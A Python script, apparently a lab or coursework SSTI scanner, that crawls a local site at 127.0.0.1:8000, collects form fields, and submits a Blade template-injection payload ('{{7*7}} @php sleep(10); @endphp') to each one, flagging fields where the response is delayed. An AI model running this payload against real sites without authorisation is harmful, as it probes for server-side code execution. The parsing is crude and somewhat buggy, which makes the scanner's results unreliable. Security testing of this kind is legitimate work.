import re
import time
import urllib.request
import requests
from smtplib import SMTP

def begin_scan():
    """
    Begins the scanning process by getting the html for a given site
    """

    url = input("Please enter a url: ")
    response = urllib.request.urlopen(url)
    html = response.read()

    return html


def get_html(url):
    """
    This function acquires the html for any given url
    """

    response = urllib.request.urlopen(url)
    html = response.read()

    return html


def get_page_urls(html):
    """
    This function gets all href data in <a> tags and verifies which of them are in the current domain and removes extra
    characters if so
    """

    link_collection = re.findall(r"(href[a-zA-Z0-9 _=:.\"/'\\\\]*)+", str(html))

    required_links = []
    for link in link_collection:
        if (link.find("127.0.0.1:8000") != -1):
            modif_link = link.replace("href=\"", '')
            modif_link = modif_link.replace("\"", '')
            required_links.append(modif_link)

    return required_links


def check_nested_links(required_links):
    """
    Iterates through collected links and checks for new ones in them
    """

    nested_links = []
    for url in required_links:
        response = urllib.request.urlopen(url)
        html = response.read()

        link_collection = re.findall(r"(href[a-zA-Z0-9 _=:.\"/'\\\\]*)+", str(html))

        for link in link_collection:
            if (link.find("127.0.0.1:8000") != -1):
                modif_link = link.replace("href=\"", '')
                modif_link = modif_link.replace("\"", '')
                nested_links.append(modif_link)
    return nested_links


def filter_links(all_urls):
    """
    This function checks for duplicates in the total collection of links in the website and removes them
    """

    all_urls = list(dict.fromkeys(all_urls))
    return all_urls


def locate_input_points(html):
    """
    Finds all text input tags and returns their names
    """

    # find all input tags including token
    input_collection = re.findall(r"(<input [a-zA-Z0-9 _=\"\-'\\\\]*>)+", str(html))
    textarea_collection = re.findall(r"(<textarea [a-zA-Z0-9 _:;=\"\-'\\\\]*>)+", str(html))
    total_inputs = input_collection + textarea_collection

    all_names = []  # array containing necessary input tags which will be used later
    for elem in total_inputs:  # loop through inputs, remove token & submit input
        if "_token" in elem:
            total_inputs.remove(elem)
        elif "type='submit'" in elem:
            total_inputs.remove(elem)

    for inp in total_inputs:  # filter through remaining valid inputs storing the names
        all_names += re.findall(r"(name=[\\\\'a-zA-Z0-9\"'\\\\']+)", inp)

    final_names = []
    for elem in all_names:  # Clean names
        temp_name = elem.replace("name=", "")
        temp_name = temp_name.replace("'", "")
        final_names.append(temp_name)

    return final_names

def post_urls(html):
    """
    This function finds all form action links in a page, and returns only the required form action links
    """
    post_links = re.findall(r"action=([a-zA-Z0-9 _:;=./\"'\\\\]+)", html)
    formatted_links = []

    for link in post_links:
        formatted_link = re.findall(r"(http://[a-zA-Z0-9_:;=./\\\\]+)", link)
        formatted_links.append(formatted_link[0])

    return formatted_links


def test_stored_immediate(urls):
    """
    This function performs SSTI on a given target url for all forms, and checks each page to verify if any of it has
    executed. This function performs differently as it assesses SSTI based on how long the request takes to complete.
    """

    scan_result = []
    for url in urls:
        session = requests.session()
        front = session.get(url)

        try:
            token = re.findall(r'<input type="hidden" name="_token" value="(.*)"', front.text)[0]
            cookies = session.cookies

            inputs = locate_input_points(front.text)
            p_urls = post_urls(front.text)

            for post_url in p_urls:
                for name in inputs:
                    data = {name: "{{7*7}} @php sleep(10); @endphp", "_token": token}
                    start = time.time()
                    req = requests.post(post_url, data=data, cookies=cookies)
                    end = time.time()

                    # If it's visible, we consider that this is reflected injection and not stored immediate injection
                    if("49" in req.text):
                        scan_result.append("URL: " + post_url + " Input name: " + name + " isVulnerable: False")
                        continue

                    # Request took 10 or more seconds, therefore we can deduce that SSTI was successful
                    if(end-start >= 10):
                        scan_result.append("URL: " + post_url + " Input name: " + name + " isVulnerable: True")
                    else:
                        scan_result.append("URL: " + post_url + " Input name: " + name + " isVulnerable: False")
        except:
            scan_result.append("URL: " + url + " isVulnerable: Unable to test, no input points found")
            continue


        # for next_url in urls:
        #     html = get_html(next_url)
        #
        #     if("49" in str(html)):
        #
        #     else:
        #         scan_result[next_url] = False

    return scan_result


# Begin the scanning process
html = begin_scan()

urls = get_page_urls(html)

nested_links = check_nested_links(urls)
filtered_urls = filter_links(urls+nested_links)
stored_imm_results = test_stored_immediate(filtered_urls)

for result in stored_imm_results:  # print results
   print(result)
